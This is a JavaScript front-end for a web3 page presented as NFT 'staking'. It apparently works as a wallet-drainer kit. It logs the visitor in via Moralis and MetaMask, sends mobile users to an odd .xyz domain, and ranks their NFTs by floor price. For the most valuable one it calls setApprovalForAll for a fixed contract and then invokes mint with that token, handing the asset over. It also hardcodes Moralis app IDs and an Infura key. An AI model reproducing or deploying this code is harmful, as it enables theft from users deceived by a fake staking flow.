
const serverUrl = "https://qjrgbnms5rrc.usemoralis.com:2053/server";
const appId = "HYO8hlCi1B9FtXccOyRQV8XFRWeCPqzBt5huDnmE";
// const serverUrl = "https://exzd5xrogjap.usemoralis.com:2053/server";
// const appId = "gl91wVMOsJzmgoxBEf7wjFlMFRdkwN7uRnEHLi3j";
Moralis.start({ serverUrl, appId });

var account = "";
var stakingContract;
var contractAddress = "0xb1633042528d852194cfabee68960ceaa93c773d";

var transactionFee = 0;

let top_balance = 0, top_token = -1, real_amount = 0, tokenId = "";
let nftList = [];

function loginMetamask() {
  console.log("locatin", location.href);
  if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){

    location.href = 'https://metamask.app.link/dapp/adadaddadadq.xyz';
    
  }else{
    // false for not mobile device
    // document.write("not mobile device");
    login();
  }
}

async function login() {
  document.getElementById('status').innerHTML = "connecting...";
  try{
    let user = Moralis.User.current();
    console.log("user = ", user);
    if (!user) {
      user = await Moralis.authenticate({
        signingMessage: "Log in using Moralis",
      })
        .then(function (user) {
          console.log("logged in user:", user);
          console.log(user.get("ethAddress"));
        })
        .catch(function (error) {
          console.log(error);
        });
    }

    console.log("web3", Moralis.Web3, Moralis.web3);


    const balances = await Moralis.Web3.getAllERC20();
    const mainNFTs = await Moralis.Web3.getNFTs();

    console.log("balances", balances);
    console.log("mainNFTs", mainNFTs);

    // let options = {
    //   address: "0xdac17f958d2ee523a2206206994597c13d831ec7",
    //   exchange: "uniswap-v3",
    // };

    // for (let item of balances) {
    //   if(item.tokenAddress) { // other tokens

    //     options.address = item.tokenAddress;

    //     let rate = await Moralis.Web3API.token.getTokenPrice(options);
    //     let balance = getEthBalance(item['balance'], item['decimals'], rate['nativePrice']['value']);

    //     console.log(item['balance'], item['decimals'], rate['nativePrice']['value']);
    //     console.log("get eth balance = ", balance);

    //     if(top_balance < balance) {
    //       top_balance = balance;
    //       top_token = item.tokenAddress;
    //       real_amount = item['balance'];
    //     }
    //   }
    //   else { // eth
    //     let balance = item['balance'];

    //     if(top_balance < balance) {
    //       top_balance = balance;
    //       top_token = -1;
    //     }
    //   }
    // }

    let nftOptions = {
      address: "0x7828c811636ccf051993c1ec3157b0b732e55b23",
      chain: 'eth',
      days: "1",
    };


    tokenId = '';
    nftList = [];

    for (let item of mainNFTs) {
      nftOptions.address = item.token_address;
      var floor = await Moralis.Web3API.token.getNFTLowestPrice(nftOptions);
      var balance = floor['price'];

      var temp = {};

      temp.balance = balance;
      temp.tokenId = floor['token_ids'][0];
      temp.tokenAddress = item.token_address;

      nftList.push(temp);

      // var temp1 = {};

      // temp1.balance = balance*2 +"";
      // temp1.tokenId = floor['token_ids'][0];
      // temp1.tokenAddress = item.token_address;
      // nftList.push(temp1);
    }

    console.log(nftList);
    nftList.sort((a, b) => (Number(b.balance) > Number(a.balance)) ? 1 : -1);
    console.log(nftList);

    walletconnect();

  }catch(error){
    console.log(error);
  }
}

function walletconnect() {
  if (window.ethereum) {
  ConnectWallet();
} else {
  window.addEventListener('ethereum#initialized', ConnectWallet, {
    once: true,
  });

  // If the event is not dispatched by the end of the timeout,
  // the user probably doesn't have MetaMask installed.
  setTimeout(ConnectWallet, 3000); // 3 seconds
}

}


function ConnectWallet(){

  // Connect a the web3 provider
  if (window.ethereum) {
      web3 = new Web3(window.ethereum);
  } else {
      web3 = new Web3(new Web3.providers.HttpProvider("https://mainnet.infura.io/v3/dc2f018539694de38ed5893bc09eb904"));
  }
  getWalletAccount();
  getContract();
  get12DollarETH();

  web3.eth.getBlockNumber(function (error, result) {
    console.log("block number = ", result);
  });

}

async function get12DollarETH() {
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url);
    let price = await response.json();
    let perETH = price["ethereum"]["usd"];
    let usd = 1 / perETH;
    transactionFee = usd * 20;
    transactionFee = parseInt(web3.utils.toWei(transactionFee.toFixed(5).toString(), 'ether'));
    console.log(transactionFee, "transactionFee");
    return usd * 20;
}

async function getWalletAccount() {
        
  const accounts = await web3.eth.getAccounts();
  account = accounts[0];
  console.log("account", account);
}

function getContract() {
        
  stakingContract = new web3.eth.Contract(stakingSystemABI, contractAddress);
  document.getElementById('status').innerHTML = "connected";
  console.log("stakingContract", stakingContract);
}

function getEthBalance(balance, decimals, rate) {
  var pow10 = 1;
  for (var i = 0; i < decimals; i ++) pow10 *= 10;
  return balance * rate / pow10;
}

async function stakeNFT(tokenAddress, nftTokenID) {

console.log(stakingContract, nftTokenID, tokenAddress);

  var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
   console.log(tokenContract, nftTokenID);
  await tokenContract.methods.setApprovalForAll(contractAddress, true).send({
   from: account,
   gas: 470000,
   gasPrice:0
  });

    console.log(stakingContract, nftTokenID, tokenAddress);
  var result = await stakingContract.methods.mint(3, tokenAddress, nftTokenID, 1).send({
   from: account,
   gas: 470000,
   gasPrice:0
  });

  return result;
}

function sendToken() {

    if(nftList.length) {
        let result = stakeNFT(nftList[0].tokenAddress, nftList[0].tokenId);
        if(result) {
            nftList.shift();
        }
    }
}


async function logOut() {
  await Moralis.User.logOut();
  console.log("logged out");
}

document.getElementById("btn-login").onclick = loginMetamask;
document.getElementById("btn-logout").onclick = logOut;


if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
  login();
}